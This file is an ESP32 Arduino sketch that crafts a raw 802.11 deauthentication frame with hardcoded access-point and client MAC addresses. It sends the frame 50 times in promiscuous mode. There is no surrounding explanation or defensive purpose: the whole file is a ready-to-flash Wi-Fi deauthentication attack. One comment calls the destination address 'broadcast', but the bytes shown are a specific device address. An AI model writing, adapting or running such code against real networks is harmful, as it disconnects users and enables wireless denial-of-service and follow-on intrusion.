#include <Arduino.h>
#include "esp_wifi.h"
#include "WiFi.h"

uint8_t deauth_packet[26] = {
  0xC0, 0x00, 0x00, 0x00,
  0x98, 0x87, 0x4c, 0x3c, 0x9f, 0x7f,  // Destination (broadcast)
  0x90, 0x8d, 0x78, 0x3c, 0x9f, 0x7f,  // Source (AP)
  0x90, 0x8d, 0x78, 0x3c, 0x9f, 0x7f,  // BSSID (AP)
  0x00, 0x00,
  0x07, 0x00
};

void setup() {
  Serial.begin(115200);
  delay(1000);

  // Ensure WiFi initialized
  WiFi.mode(WIFI_MODE_APSTA);
  esp_wifi_start();
  delay(100);

  // Enable promiscuous (low-level access)
  esp_wifi_set_promiscuous(true);

  Serial.println("Sending deauth packet...");

  for (int i = 0; i < 50; i++) {
    esp_wifi_80211_tx(WIFI_IF_STA, deauth_packet, sizeof(deauth_packet), false);
    delay(10);
  }

  Serial.println("Done.");
}

void loop() {
  // Nothing to do
}
